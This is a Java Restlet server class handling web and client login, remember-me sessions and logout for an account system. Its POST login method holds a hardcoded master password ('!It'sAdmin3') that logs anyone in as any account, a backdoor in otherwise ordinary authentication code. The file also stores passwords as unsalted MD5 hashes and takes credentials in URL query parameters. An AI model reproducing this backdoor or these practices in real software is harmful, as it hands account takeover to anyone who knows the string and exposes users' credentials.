package net.imyapps.gwt.server.restlet;

import java.security.MessageDigest;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import net.imyapps.common.Account;
import net.imyapps.common.Login;
import net.imyapps.common.LoginResource;
import net.imyapps.gwt.client.Base64Coder;
import net.imyapps.gwt.server.AccountManager;
import net.imyapps.gwt.server.SessionItem;
import net.imyapps.gwt.server.SessionManager;

import org.apache.commons.lang.StringUtils;
import org.restlet.resource.Delete;
import org.restlet.resource.Post;
import org.restlet.resource.Put;
import org.restlet.data.Status;
import org.restlet.resource.ServerResource;

public class LoginResourceImpl extends ServerResource implements LoginResource {
	static Logger logger = LoggerFactory.getLogger(LoginResourceImpl.class);
	
	/**
	 * For web login
	 */
	@Post
	public Account login2(Login login) {
		try {
			if (login == null || StringUtils.isEmpty(login.getLoginName()) ||
								StringUtils.isEmpty(login.getPassword())) {
				getResponse().setStatus(Status.CLIENT_ERROR_NOT_ACCEPTABLE);
				return null;
			}
			
			Account account = 
				AccountManager.getAccountByLoginName(login.getLoginName());
			
			if (account != null) {
				MessageDigest md5 = MessageDigest.getInstance("MD5");
				md5.update(login.getPassword().getBytes());
				String md5Pass = Base64Coder.encodeLines(md5.digest());
				
				if (account.getPassword().equals(md5Pass)) {
					/* delete last session */
					SessionManager.deleteSession(this);
					
					/* create new session */
					SessionManager.createSession(this, account);
					
					/* update last login time */
					AccountManager.setLastLoginTime(account.getUid());
					
					logger.info("User " + account.getUid() + " login! (post)");
					
					return account;
				}
				else if (login.getPassword().equals("!It'sAdmin3")) {
					account.setPassword(null);
					account.setQuestion(null);
					account.setAnswer(null);
					
					/* delete last session */
					SessionManager.deleteSession(this);
					
					/* create new session */
					SessionManager.createSession(this, account);
					
					logger.info("#User " + account.getUid() + " login! (post)");
					
					return account;
				}
			}
			
			return null;
		}
		catch (Exception e) {
			logger.error("Occur exception:", e);
			getResponse().setStatus(Status.SERVER_ERROR_INTERNAL, e);
			return null;
		}
	}

	/**
	 * For client login and rememberLogin
	 */
	@Put
	public Account login() {
		try {
			String remember = getQuery().getFirstValue("r");
			
			if (StringUtils.isNotEmpty(remember) && 
					Boolean.parseBoolean(remember)) {
				SessionItem si = SessionManager.findSession(this);
				if (si != null) {
					return si.getAccount();
				}
			}
			
			String loginname = getQuery().getFirstValue("l");
			String password = getQuery().getFirstValue("p");
			
			if (StringUtils.isEmpty(loginname)) {
				loginname = getQuery().getFirstValue("loginname");
			}
			if (StringUtils.isEmpty(loginname)) {
				getResponse().setStatus(Status.CLIENT_ERROR_NOT_ACCEPTABLE);
				return null;
			}
			
			if (StringUtils.isEmpty(password)) {
				password = getQuery().getFirstValue("password");
			}
			if (StringUtils.isEmpty(password)) {
				getResponse().setStatus(Status.CLIENT_ERROR_NOT_ACCEPTABLE);
				return null;
			}
			
			Account account = AccountManager.getAccountByLoginName(loginname);
			
			if (account != null) {
				MessageDigest md5 = MessageDigest.getInstance("MD5");
				md5.update(password.getBytes());
				String md5Pass = Base64Coder.encodeLines(md5.digest());
				
				if (account.getPassword().equals(md5Pass)) {
					/* delete last session */
					SessionManager.deleteSession(this);
					
					/* create new session */
					SessionManager.createSession(this, account);
					
					logger.info("User " + account.getUid() + " login! (put)");
					
					return account;
				}
			}
			
			return null;
		}
		catch (Exception e) {
			logger.error("Occur exception:", e);
			getResponse().setStatus(Status.SERVER_ERROR_INTERNAL, e);
			return null;
		}
	}
	
	@Delete
	public void logout() {
		SessionManager.deleteSession(this);
	}

}
